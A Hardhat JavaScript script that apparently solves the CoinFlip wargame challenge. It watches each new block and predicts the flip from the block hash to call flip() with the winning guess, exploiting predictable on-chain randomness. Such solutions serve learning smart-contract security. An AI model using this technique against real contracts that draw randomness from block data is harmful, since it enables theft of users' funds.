const { assert } = require("console");
const { ethers } = require("hardhat");
const hre = require("hardhat");
require("dotenv").config({ path: ".env" });

CONTRACT_NAME = "CoinFlip"

async function getContract(wallet) {
  const factory = await hre.ethers.getContractFactory(CONTRACT_NAME);
  let contract = null;
  if(hre.network.name == "hardhat") {
    contract = await factory.deploy();
    await contract.deployed();
  }
  else {
    contract = factory.attach(process.env.CONTRACT_ADDRESS);
  }
  return contract.connect(wallet);
}

async function giveWalletMoney(hacker) {
  assert(hre.network.name == "hardhat");
  const [owner] = await ethers.getSigners();
  const trans = await owner.sendTransaction({
    to: hacker.address,
    value: ethers.utils.parseEther("0.1"),
  });
  await trans.wait()
}

// dong this in a contract instead is much better, doing it this way fails a lot and takes more time

async function main() {
  console.log("network name:", hre.network.name);
  const hacker = new ethers.Wallet(process.env.PRIVATE_KEY, hre.ethers.provider);
  contract = await getContract(hacker);
  if(hre.network.name == "hardhat") {
    console.log("getting some eth")
    giveWalletMoney(hacker);
  }

  console.log("hacking contract:", contract.address);

  ethers.provider.on("block", async (blockNumber) => {
    try {
      console.log("consecutive wins:", await contract.consecutiveWins());
      const block = await ethers.provider.getBlock(blockNumber);
      console.log("block:", blockNumber, block.hash);
      const hashNumber = ethers.BigNumber.from(block.hash);
      const factor = ethers.BigNumber.from("57896044618658097711785492504343953926634992332820282019728792003956564819968");
      const guess = hashNumber.div(factor).eq(ethers.BigNumber.from(1));
      await contract.flip(guess);
    }
    catch(err) {
      console.log("rejection:", err);
    }
  });


}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});